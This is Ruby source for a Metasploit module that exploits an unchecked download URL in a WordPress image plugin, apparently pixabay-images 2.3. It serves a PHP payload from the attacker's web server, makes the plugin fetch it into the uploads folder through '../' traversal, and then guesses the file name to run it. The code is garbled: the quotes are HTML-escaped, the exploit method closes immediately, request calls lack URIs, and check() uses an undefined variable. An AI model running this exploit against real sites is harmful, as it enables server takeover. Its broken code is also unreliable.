# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      &#039;Description&#039;    => %q{
        Images 2.3.6. The plugin does not check the host of a provided download URL
        which can be used to store and execute malicious PHP code on the system.
      },
      &#039;Author&#039;  =>
        [
          &#039;h0ng10&#039;, # Discovery, Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://www.mogwaisecurity.de/advisories/MSA-2015-01.txt&#039;],
          [&#039;OSVDB&#039;, &#039;117145&#039;],
          [&#039;OSVDB&#039;, &#039;117146&#039;],
          [&#039;WPVDB&#039;, &#039;7758&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;pixabay-images 2.3&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
        },
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;DisclosureDate&#039; => &#039;Jan 19 2015&#039;
    ))

    register_options(
      [
        OptInt.new(&#039;TRIES&#039;, [true, &#039;Number of guesses if initial name guess fails&#039;, 5]),
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;Traversal path until the uploads folder&#039;, 4])
      ], self.class)
  end


  # Handle incoming requests from the server
  def on_request_uri(cli, request)
      print_status("URI requested: #{request.raw_uri}")
      send_response(cli, payload.encoded)
  end

  # Create a custom URI
  def generate_payload_uri
      "#{get_uri}.php"
  end

  def call_payload(file_name)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
    }, 3)

    res
  end

  def exploit
    end

    print_status("#{peer} - Starting up web service...")
    start_service

    payload_uri = generate_payload_uri
    vprint_status("#{peer} - Using URI #{payload_uri}")

    random_file_name = rand_text_alphanumeric(rand(5) + 5)
    post = {
      &#039;pixabay_upload&#039; => rand_text_alphanumeric(rand(5) + 5),
      &#039;image_url&#039; => payload_uri,
      &#039;image_user&#039; => rand_text_alphanumeric(rand(5) + 5),
      &#039;q&#039; => "#{&#039;../&#039; * datastore[&#039;DEPTH&#039;]}#{random_file_name}"
    }

    print_status("#{peer} - Uploading payload #{random_file_name}...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post
    })

    stop_service

    unless res && res.code == 200 && res.headers[&#039;date&#039;]
      fail_with(Failure::Unknown, "#{peer} - Upload failed or unable to guess the system time...")
    end

    server_epoch_time = DateTime.strptime(res.headers[&#039;date&#039;], &#039;%a, %d %b %Y %H:%M:%S GMT&#039;).to_i

    print_status("#{peer} - Calling payload...")
    datastore[&#039;TRIES&#039;].times do |i|
      payload_name = "#{random_file_name}_#{server_epoch_time + i}.php"
      res = call_payload(payload_name)
      if (res && res.code == 200) || session_created?
        register_files_for_cleanup(payload_name)
        break
      end
    end
  end

  def check
    unless res
      return Exploit::CheckCode::Unknown
    end

    # Send a request with a illegal URL to verify that the target is vulnerable
    post = {
      &#039;pixabay_upload&#039; => rand_text_alphanumeric(rand(5) + 5),
      &#039;image_url&#039; => rand_text_alphanumeric(rand(5) + 5),
      &#039;image_user&#039; => rand_text_alphanumeric(rand(5) + 5),
      &#039;q&#039; => rand_text_alphanumeric(rand(5) + 5)
    }

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post
    })

    if res && res.body && res.body.to_s =~ /Error: A valid URL was not provided/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end
end

